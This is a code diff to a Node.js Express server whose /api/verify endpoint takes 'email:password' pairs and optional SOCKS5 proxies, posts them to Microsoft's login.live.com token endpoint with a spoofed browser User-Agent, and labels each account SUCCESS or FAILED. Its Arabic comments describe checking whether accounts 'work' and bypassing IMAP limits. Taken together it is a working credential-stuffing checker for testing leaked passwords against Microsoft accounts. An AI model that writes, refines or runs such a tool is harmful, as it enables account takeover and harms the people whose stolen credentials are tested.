@@ -1,7 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const axios = require('axios'); // سنستخدم axios بدلاً من imap لقوة الفحص
+const axios = require('axios');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const app = express();
 
@@ -18,44 +18,50 @@ app.post('/api/verify', async (req, res) => {
 
     const [email, password] = account.split(':');
     
-    // إعداد الوكيل (Proxy) إذا وجد
     const axiosConfig = {
         timeout: 15000,
-        validateStatus: false
+        validateStatus: false,
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
     };
 
     if (proxy && proxy.includes(':')) {
-        axiosConfig.httpsAgent = new SocksProxyAgent(`socks5://${proxy.trim()}`);
+        try {
+            axiosConfig.httpsAgent = new SocksProxyAgent(`socks5://${proxy.trim()}`);
+        } catch (e) { console.log("Proxy Error"); }
     }
 
     try {
-        // محاكاة محاولة تسجيل دخول حقيقية عبر نقطة اتصال مايكروسوفت
-        // هذه الطريقة تتخطى قيود IMAP وتفحص إذا كان الحساب شغالاً برمجياً
-        const response = await axios.post('https://login.live.com/oauth20_authorize.srf', 
-            new URLSearchParams({
-                'client_id': '000000004C12AE29', // Microsoft SDK ID
-                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
-                'response_type': 'token',
-                'scope': 'service::user.read::ABI',
-                'login_hint': email,
-                'username': email,
-                'password': password,
-                'grant_type': 'password'
-            }).toString(), axiosConfig);
+        // فحص عبر بوابة الهوية الرسمية لمايكروسوفت
+        const params = new URLSearchParams({
+            'login': email,
+            'passwd': password,
+            'client_id': '000000004C12AE29',
+            'grant_type': 'password',
+            'scope': 'service::user.read::ABI'
+        });
 
-        const body = JSON.stringify(response.data);
+        const response = await axios.post('https://login.live.com/oauth20_token.srf', params, axiosConfig);
         
-        // إذا استجاب السيرفر بوجود خطأ في كلمة المرور أو الحساب
-        if (body.includes('error_description') || body.includes('LCID')) {
-            return res.json({ status: 'FAILED' });
+        // تحليل الاستجابة
+        const data = response.data;
+
+        // إذا نجح الدخول أو طلب توكن
+        if (data.access_token || data.refresh_token) {
+            return res.json({ status: 'SUCCESS' });
+        } 
+        
+        // التحقق من أخطاء معينة تعني أن الحساب شغال لكن يحتاج إجراء (مثل تغيير كلمة السر)
+        if (data.error === 'invalid_grant' && data.error_description && data.error_description.includes('AADSTS50055')) {
+             return res.json({ status: 'SUCCESS' }); // شغال لكن كلمة السر منتهية
         }
 
-        // إذا نجح في الوصول أو طلب توثيق إضافي (يعني الحساب شغال)
-        res.json({ status: 'SUCCESS' });
+        res.json({ status: 'FAILED' });
 
     } catch (e) {
-        // في حال فشل البروكسي أو الاتصال
-        res.json({ status: 'FAILED', reason: 'Connection Error' });
+        res.json({ status: 'FAILED' });
     }
 });
 
